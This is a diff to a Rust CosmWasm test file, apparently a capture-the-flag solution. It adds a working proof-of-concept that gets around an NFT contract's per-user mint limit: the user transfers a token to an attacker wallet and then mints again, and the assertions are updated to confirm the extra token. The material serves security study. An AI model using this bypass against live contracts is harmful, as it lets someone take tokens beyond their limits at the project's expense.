@@ -6,6 +6,10 @@ pub mod tests {
     };
     use cosmwasm_std::{Addr, Empty};
 
+    use cw721_base::{
+        ExecuteMsg as Cw721ExecuteMsg
+    };
+
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_code() -> Box<dyn Contract<Empty>> {
@@ -31,6 +35,8 @@ pub mod tests {
     pub const USER1: &str = "user1";
     pub const USER2: &str = "user2";
     pub const USER3: &str = "user3";
+
+    pub const ATTACKER_SIDE_WALLET: &str = "attacker";
 
     pub fn proper_instantiate() -> (App, Addr) {
         let mut app = App::default();
@@ -114,6 +120,23 @@ pub mod tests {
         )
         .unwrap();
 
+        // exploit - just send an NFT to another address, and then try to mint again
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            config.nft_contract.clone(),
+            &Cw721ExecuteMsg::TransferNft::<Empty, Empty> {
+                recipient: String::from(ATTACKER_SIDE_WALLET),
+                token_id: String::from("2"),
+            },
+            &[],
+        )
+        .unwrap();
+
         // exceed max limit fails
         app.execute_contract(
             Addr::unchecked(USER1),
@@ -121,7 +144,15 @@ pub mod tests {
             &ExecuteMsg::Mint {},
             &[],
         )
-        .unwrap_err();
+        .unwrap(); // exploit confirmed; USER1 their 4th token
+
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[],
+        )
+        .unwrap_err(); // fails here if USER1 doesn't transfer at least 1 nft
 
         // other users can mint freely
         app.execute_contract(
@@ -138,6 +169,6 @@ pub mod tests {
             .query_wasm_smart(contract_addr, &QueryMsg::Config {})
             .unwrap();
 
-        assert_eq!(config.total_tokens, 4);
+        assert_eq!(config.total_tokens, 5); // now there are 5 total nfts
     }
 }
